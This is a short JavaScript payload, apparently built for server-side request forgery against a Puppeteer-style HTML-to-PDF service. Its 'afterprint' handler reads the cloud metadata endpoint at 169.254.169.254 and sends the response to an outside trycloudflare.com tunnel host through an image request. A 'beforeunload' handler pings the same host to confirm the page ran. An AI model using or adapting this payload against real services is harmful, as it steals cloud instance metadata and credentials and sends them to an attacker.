// afterprint fires AFTER the print/PDF capture
// If Puppeteer triggers a print event, afterprint fires after capture
// Not useful for modifying PDF content, but useful for making SSRF requests
window.addEventListener('afterprint', function(){
  var x=new XMLHttpRequest();
  x.open('GET','http://169.254.169.254/latest/meta-data/',false);
  try{x.send();}catch(e){}
  var i=new Image();
  i.src='https://influence-barn-expenditures-agriculture.trycloudflare.com/afterprint-ssrf?data='+encodeURIComponent(x.responseText||'empty');
});
// Also beforeunload
window.addEventListener('beforeunload', function(){
  var i=new Image();
  i.src='https://influence-barn-expenditures-agriculture.trycloudflare.com/beforeunload-fired';
});
